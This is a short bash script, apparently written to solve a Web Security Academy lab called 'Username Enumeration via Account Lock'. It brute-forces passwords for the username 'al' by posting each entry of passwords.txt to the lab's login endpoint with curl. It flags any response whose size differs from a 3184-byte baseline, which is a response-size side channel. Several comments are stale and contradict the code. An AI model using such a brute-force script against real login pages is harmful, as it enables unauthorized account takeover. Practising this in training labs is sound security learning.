#!/bin/bash

echo "Username Enumeration via Account Lock"
# extract usernames wordlist from the file username.txt and inserts into the variable username
for password in $(cat passwords.txt); do
# loops through 10 times
    # for i in $(seq 1 10); do
# this variables stores the out of the curl command which sends a post req to the site and inserts each username from the wordlist and provides the page size in bytes
        response_size=$(curl -X POST -so /dev/null -d "username=al&password=$password" https://0a470073045b3188843ae00500ba0064.web-security-academy.net/login -w '%{size_download}')
# running the script first time shows the common length is 3132 so we can filter that out with this if statement

# if response is greater than 3132 echo the result into a fie named results.txt
        if [ "$response_size" -gt 3184 ]; then
            echo "username: al | password: $password response size: $response_size (greater than 3184)" >> result.txt
# if response is lesser than 3132 echo the result into a fie named results.txt
        elif [ "$response_size" -lt 3184 ]; then
            echo "username: al | password: $password response size: $response_size (lesser than 3184)" >> result.txt
        fi
# echo -n "username: $username | response size: ";
# curl -X POST -so /dev/null -d "username=$username&password=password123" https://0a470073045b3188843ae00500ba0064.web-security-academy.net/login -w '%{size_download}';
done